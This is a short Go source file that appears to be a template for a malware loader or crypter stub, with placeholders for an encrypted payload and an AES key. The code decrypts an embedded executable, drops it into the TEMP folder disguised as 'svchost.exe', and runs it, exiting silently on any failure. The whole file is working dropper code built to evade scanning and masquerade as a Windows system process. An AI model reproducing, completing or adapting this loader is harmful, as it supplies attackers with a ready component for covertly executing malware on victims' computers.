package main

import (
	"crypto/aes"
	"crypto/cipher"
	"os"
	"os/exec"
)

var EncryptedPayload = __ENCRYPTED_PAYLOAD__
var AesKey = __AES_KEY__

func main() {
	block, err := aes.NewCipher(AesKey)
	if err != nil {
		os.Exit(1)
	}

	iv := EncryptedPayload[:aes.BlockSize]
	ciphertext := EncryptedPayload[aes.BlockSize:]

	mode := cipher.NewCBCDecrypter(block, iv)
	decryptedExe := make([]byte, len(ciphertext))
	mode.CryptBlocks(decryptedExe, ciphertext)

	paddingLen := int(decryptedExe[len(decryptedExe)-1])
	if paddingLen > 0 && paddingLen <= aes.BlockSize {
		decryptedExe = decryptedExe[:len(decryptedExe)-paddingLen]
	}

	tempPath := os.Getenv("TEMP") + "\\svchost.exe"
	err = os.WriteFile(tempPath, decryptedExe, 0755)
	if err != nil {
		os.Exit(1)
	}

	cmd := exec.Command(tempPath)
	err = cmd.Run()
	if err != nil {
		os.Exit(1)
	}
}